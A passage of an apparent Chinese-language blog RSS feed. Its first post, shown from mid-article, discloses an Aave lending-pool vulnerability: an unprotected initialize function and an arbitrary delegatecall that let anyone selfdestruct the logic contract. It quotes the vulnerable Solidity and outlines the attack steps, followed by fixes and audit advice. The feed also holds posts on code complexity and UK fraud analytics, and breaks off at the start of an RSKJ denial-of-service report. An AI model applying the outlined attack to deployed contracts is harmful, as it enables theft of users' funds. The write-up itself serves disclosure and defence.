&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;initialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ILendingPoolAddressesProvider&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;provider&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;initializer&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;_addressesProvider&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;provider&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;initializer修饰符防止多次调用initialize，要求满足以下条件：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;initializing&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;isConstructor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;revision&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lastInitializedRevision&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s&#34;&gt;&amp;#39;Contract instance has already been initialized&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;其中：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;initializing允许同一交易内多次调用&lt;/li&gt;
&lt;li&gt;isConstructor()供代理合约执行代码所需&lt;/li&gt;
&lt;li&gt;revision &amp;gt; lastInitializedRevision允许合约升级时再次调用初始化函数&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过代理调用时工作正常，但第三条也允许任何人直接调用逻辑合约的initialize函数。当逻辑合约部署后：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;revision为0x2&lt;/li&gt;
&lt;li&gt;lastInitializedRevision为0x0&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;漏洞本质&lt;/strong&gt;：任何人都能设置LendingPool逻辑合约的_addressesProvider。&lt;/p&gt;
&lt;h2 id=&#34;任意delegatecall&#34;&gt;任意delegatecall
&lt;/h2&gt;&lt;p&gt;LendingPool.liquidationCall直接delegatecall到_addressProvider返回的地址：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;address&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;collateralManager&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_addressesProvider&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;getLendingPoolCollateralManager&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;bool&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;success&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;bytes&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;memory&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;collateralManager&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;delegatecall&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;abi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;encodeWithSignature&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s&#34;&gt;&amp;#39;liquidationCall(address,address,address,uint256,bool)&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;collateralAsset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;debtAsset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;debtToCover&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;receiveAToken&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;这使得攻击者可：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;初始化LendingPool逻辑合约&lt;/li&gt;
&lt;li&gt;设置受控的addresses provider&lt;/li&gt;
&lt;li&gt;执行任意代码（包括selfdestruct）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;攻击场景&lt;/strong&gt;：任何人都能销毁借贷池逻辑合约。简化示意图如下：&lt;/p&gt;
&lt;h2 id=&#34;存在性检查缺失&#34;&gt;存在性检查缺失
&lt;/h2&gt;&lt;p&gt;该漏洞本身已足够严重（可类比Parity事件）。但OpenZeppelin代理合约的使用放大了危害。我们2018年的博文曾指出：对空合约的delegatecall会返回success但不会执行任何代码。尽管有此警告，OpenZeppelin仍未修复其代理合约的回退函数：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;_delegate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;address&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;implementation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;internal&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;assembly&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nf&#34;&gt;calldatacopy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;calldatasize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;ow&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;delegatecall&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;gas&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;implementation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;calldatasize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;若代理合约delegatecall到已被销毁的逻辑合约，代理将返回success但实际未执行任何代码。虽然Aave可通过更新代理指向新逻辑合约来修复，但在漏洞存在期间，任何第三方合约调用借贷池时都会误认为代码已执行。&lt;/p&gt;
&lt;h2 id=&#34;受影响合约&#34;&gt;受影响合约
&lt;/h2&gt;&lt;p&gt;所有AToken：用户燃烧AToken但无法取回底层资产
WETHGateway：存款会存储在网关中导致资产被盗
基于Aave Credit Delegation v2的所有代码库
其他受影响的外部合约包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DefiSaver v1/v2&lt;/li&gt;
&lt;li&gt;PieDao等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这凸显了DeFi可组合性的潜在风险。&lt;/p&gt;
&lt;h2 id=&#34;修复建议&#34;&gt;修复建议
&lt;/h2&gt;&lt;p&gt;幸运的是漏洞在被利用前就被修复。Aave调用了两个版本借贷池的initialize函数进行加固：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;V1修复时间：2020-12-04 19:34:26 UTC&lt;/li&gt;
&lt;li&gt;V2修复时间：2020-12-04 19:53:00 UTC&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;长期建议：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在所有逻辑合约中添加构造函数禁用initialize函数&lt;/li&gt;
&lt;li&gt;在代理合约的回退函数中添加合约存在性检查&lt;/li&gt;
&lt;li&gt;仔细审查delegatecall陷阱并使用slither-check-upgradeability&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;形式化验证非万能&#34;&gt;形式化验证非万能
&lt;/h2&gt;&lt;p&gt;Aave代码库经过&amp;quot;形式化验证&amp;quot;，但该漏洞证明安全属性并非绝对。验证报告中的属性（如操作成功时返回true不回滚）在逻辑合约被销毁时就会失效。可能原因包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;验证未考虑可升级性&lt;/li&gt;
&lt;li&gt;验证工具不支持复杂合约交互&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;形式化技术虽好，但需注意其覆盖范围有限。相比之下，自动化工具（如Slither）和人工审计能以较少资源实现更高安全保证。&lt;/p&gt;
&lt;h2 id=&#34;结论&#34;&gt;结论
&lt;/h2&gt;&lt;p&gt;Aave反应迅速值得肯定，但其他项目就没这么幸运。我们建议开发者在部署前：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;参考我们的安全清单和培训材料&lt;/li&gt;
&lt;li&gt;将Slither加入CI流程并检查所有报告&lt;/li&gt;
&lt;li&gt;给予安全团队充足的审计时间&lt;/li&gt;
&lt;li&gt;谨慎处理可升级性，至少阅读相关反模式文档&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;我们通过公开此漏洞和Slither检测器希望预防类似错误。安全是持续过程，建议项目启动前联系我们进行安全审计。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>软件公司如何应对代码复杂性：从个体贡献者到管理层的实践指南</title>
        <link>http://localhost:1313/p/%E8%BD%AF%E4%BB%B6%E5%85%AC%E5%8F%B8%E5%A6%82%E4%BD%95%E5%BA%94%E5%AF%B9%E4%BB%A3%E7%A0%81%E5%A4%8D%E6%9D%82%E6%80%A7%E4%BB%8E%E4%B8%AA%E4%BD%93%E8%B4%A1%E7%8C%AE%E8%80%85%E5%88%B0%E7%AE%A1%E7%90%86%E5%B1%82%E7%9A%84%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97/</link>
        <pubDate>Sat, 02 Aug 2025 20:47:42 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E8%BD%AF%E4%BB%B6%E5%85%AC%E5%8F%B8%E5%A6%82%E4%BD%95%E5%BA%94%E5%AF%B9%E4%BB%A3%E7%A0%81%E5%A4%8D%E6%9D%82%E6%80%A7%E4%BB%8E%E4%B8%AA%E4%BD%93%E8%B4%A1%E7%8C%AE%E8%80%85%E5%88%B0%E7%AE%A1%E7%90%86%E5%B1%82%E7%9A%84%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97/</guid>
        <description>&lt;h3 id=&#34;代码复杂性的解决本质&#34;&gt;代码复杂性的解决本质
&lt;/h3&gt;&lt;p&gt;一个看似简单却蕴含深意的观点：&lt;strong&gt;只有个体程序员能真正解决代码复杂性&lt;/strong&gt;。这意味着：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;需要开发者对代码投入专注力&lt;/li&gt;
&lt;li&gt;工具只是辅助，最终依赖人类智能的运用&lt;/li&gt;
&lt;li&gt;本质上是需要个体贡献者层面的细致工作&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当管理者仅笼统要求&amp;quot;简化代码&amp;quot;时往往无效，因为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;指令缺乏具体性&lt;/li&gt;
&lt;li&gt;管理者缺乏对每段代码的深入了解&lt;/li&gt;
&lt;li&gt;问题理解过程本身就是解决方案的一部分&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;管理层的常见误区&#34;&gt;管理层的常见误区
&lt;/h3&gt;&lt;p&gt;高层管理者（如CTO/技术副总）若只给出&amp;quot;提高代码质量&amp;quot;这类宽泛指令，往往导致：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;团队产生大量无效动作&lt;/li&gt;
&lt;li&gt;代码库质量未见实质提升&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;常见错误模式包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;试图用统一方案解决所有复杂性问题&lt;/li&gt;
&lt;li&gt;忽视问题由多个需要精细处理的小项目组成&lt;/li&gt;
&lt;li&gt;最终导致工程师感觉付出努力却未产出可维护代码&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;可操作的解决框架&#34;&gt;可操作的解决框架
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;问题收集阶段&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;让每位团队成员列出代码中最令人沮丧的部分&lt;/li&gt;
&lt;li&gt;关注症状而非原因：如&amp;quot;修改时令人紧张的模块&amp;quot;&lt;/li&gt;
&lt;li&gt;给予数天时间自由记录，不强制格式&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;问题定位会议&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;6-7人规模的小组会议&lt;/li&gt;
&lt;li&gt;将每个症状关联到具体代码单元（文件/类/方法）&lt;/li&gt;
&lt;li&gt;示例：将&amp;quot;缺乏单元测试&amp;quot;转化为&amp;quot;X模块重构时无法验证兼容性&amp;quot;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;问题跟踪与优先级&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;为每个确认的问题创建工单（仅描述问题）&lt;/li&gt;
&lt;li&gt;优先级考量：
&lt;ul&gt;
&lt;li&gt;影响开发者数量与严重程度&lt;/li&gt;
&lt;li&gt;问题间的依赖关系（关键排序常被忽视）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;技术负责人应主导依赖关系分析&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;任务分配与执行&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;常规功能开发中持续穿插代码清理&lt;/li&gt;
&lt;li&gt;每个开发周期（如季度）包含相关清理任务&lt;/li&gt;
&lt;li&gt;理想顺序：先清理阻碍当前功能开发的代码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;技术债务的真相&#34;&gt;技术债务的真相
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;即时成本&lt;/strong&gt;：拙劣决策在数小时/天/周内就会产生影响&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;时间假象&lt;/strong&gt;：正确实现与错误实现耗时通常相当&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;复合效应&lt;/strong&gt;：持续优化保持系统弹性，临时捷径会产生&amp;quot;无法移动的巨石&amp;quot;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;持续改进的关键&#34;&gt;持续改进的关键
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;避免完全停止功能开发来&amp;quot;大扫除&amp;quot;&lt;/li&gt;
&lt;li&gt;保持代码质量工作的持续投入&lt;/li&gt;
&lt;li&gt;建立&amp;quot;边开发边优化&amp;quot;的文化节奏&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;作者后记：这套方法需要结合常识与经验灵活运用，但已足够显著改善代码库质量。如需深度指导，可联系作者进行企业内训。&lt;/p&gt;&lt;/blockquote&gt;
&lt;hr&gt;
</description>
        </item>
        <item>
        <title>英国国家审计署建议政府运用数据分析技术打击欺诈行为</title>
        <link>http://localhost:1313/p/%E8%8B%B1%E5%9B%BD%E5%9B%BD%E5%AE%B6%E5%AE%A1%E8%AE%A1%E7%BD%B2%E5%BB%BA%E8%AE%AE%E6%94%BF%E5%BA%9C%E8%BF%90%E7%94%A8%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%89%93%E5%87%BB%E6%AC%BA%E8%AF%88%E8%A1%8C%E4%B8%BA/</link>
        <pubDate>Sat, 02 Aug 2025 20:36:32 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E8%8B%B1%E5%9B%BD%E5%9B%BD%E5%AE%B6%E5%AE%A1%E8%AE%A1%E7%BD%B2%E5%BB%BA%E8%AE%AE%E6%94%BF%E5%BA%9C%E8%BF%90%E7%94%A8%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%89%93%E5%87%BB%E6%AC%BA%E8%AF%88%E8%A1%8C%E4%B8%BA/</guid>
        <description>&lt;h3 id=&#34;政府现有反欺诈措施的局限性&#34;&gt;政府现有反欺诈措施的局限性
&lt;/h3&gt;&lt;p&gt;英国政府部门目前拥有28个数据共享协议用于欺诈检测，但国家审计署(NAO)最新报告指出，这些措施过度依赖事后追查，缺乏预防性控制机制。现有数据分析工具主要用于识别已发生的错误支付，而非嵌入业务流程的前端预防。&lt;/p&gt;
&lt;h3 id=&#34;技术应用的经济效益&#34;&gt;技术应用的经济效益
&lt;/h3&gt;&lt;p&gt;2023-24年度英国因欺诈和错误导致的财政损失高达550-810亿英镑。报告显示，从基础的去重检查到人工智能风险交易识别，数据分析技术能确保资金准确流向合法接收方。NAO特别强调：&amp;ldquo;高质量关联数据可使新技术快速实现投资回报，无需等待整体数字转型完成。&amp;rdquo;&lt;/p&gt;
&lt;h3 id=&#34;数据共享的体制障碍&#34;&gt;数据共享的体制障碍
&lt;/h3&gt;&lt;p&gt;报告揭示三大核心问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;国家欺诈倡议等中央数据平台使用率不足，主因是官员认知不足及成本顾虑&lt;/li&gt;
&lt;li&gt;反欺诈团队对可用数据集缺乏了解&lt;/li&gt;
&lt;li&gt;数据格式与系统的不一致性严重阻碍分析效率&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;关键建议与技术路线&#34;&gt;关键建议与技术路线
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;强制性数据共享&lt;/strong&gt;：财政部应强制使用国家欺诈倡议，并与公共部门欺诈管理局(PSFA)共同制定中央工具使用标准&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;跨系统安全架构&lt;/strong&gt;：建议PSFA与政府数字服务署(GDS)基于《2017年数字经济法案》建立受控数据共享流程，防范欺诈者跨系统渗透&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;私有数据源整合&lt;/strong&gt;：提议引入Cifas等第三方欺诈数据库增强监测能力&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;数字转型的未竟之路&#34;&gt;数字转型的未竟之路
&lt;/h3&gt;&lt;p&gt;尽管GDS的《现代数字政府蓝图》包含反欺诈数据分析愿景，但NAO指出其缺乏具体实施计划，特别是在欺诈数据分析维度尚未建立系统框架。报告警告，随着数据共享范围扩大，必须建立清晰的持续治理机制来管理跨系统访问风险。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>RSKJ服务器拒绝服务漏洞分析与修复</title>
        <link>http://localhost:1313/p/rskj%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E4%BF%AE%E5%A4%8D/</link>
        <pubDate>Sat, 02 Aug 2025 20:25:35 +0800</pubDate>
        
        <guid>http://localhost:1313/p/rskj%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E4%BF%AE%E5%A4%8D/</guid>
        <description>&lt;h1 id=&#34;rskj服务器拒绝服务漏洞报告&#34;&gt;RSKJ服务器拒绝服务漏洞报告
&lt;/h1&gt;&lt;h2 id=&#34;漏洞摘要&#34;&gt;漏洞摘要
&lt;/h2&gt;&lt;p&gt;攻击者通过发送特制的UDPv6数据包可导致RSKJ服务器停止处理网络流量，最终引发内存耗尽崩溃。&lt;/p&gt;
&lt;h2 id=&#34;复现步骤&#34;&gt;复现步骤
